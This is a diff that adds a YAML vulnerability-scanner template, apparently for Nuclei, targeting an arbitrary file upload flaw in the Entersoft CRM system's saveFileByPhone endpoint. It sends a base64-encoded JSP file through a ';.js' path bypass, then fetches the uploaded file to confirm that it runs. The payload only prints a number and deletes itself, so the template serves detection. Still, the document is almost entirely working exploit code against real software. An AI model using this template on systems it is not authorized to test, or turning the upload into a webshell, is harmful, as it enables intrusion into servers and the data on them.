@@ -1,0 +1,45 @@
+id: poc-yaml-entersoft-savefilebyphone-anyfile-upload
+info:
+  name: 浙大恩特客户资源管理系统 saveFileByPhone 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: '{{rand_int(1000,10000)}}'
+  t2: '{{concat("\"<%out.print(", to_string(t1), ");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\"")}}'
+  payload: '{{base64(t2)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum=954572337&filename={{t1}}.jsp&imageData={{payload}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: test
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"result\":\"success\""
+          - ".jsp"
+          - "filename"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/entsoft/image/goocodimg/goodoc/954572337/{{t1}}.jsp;.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
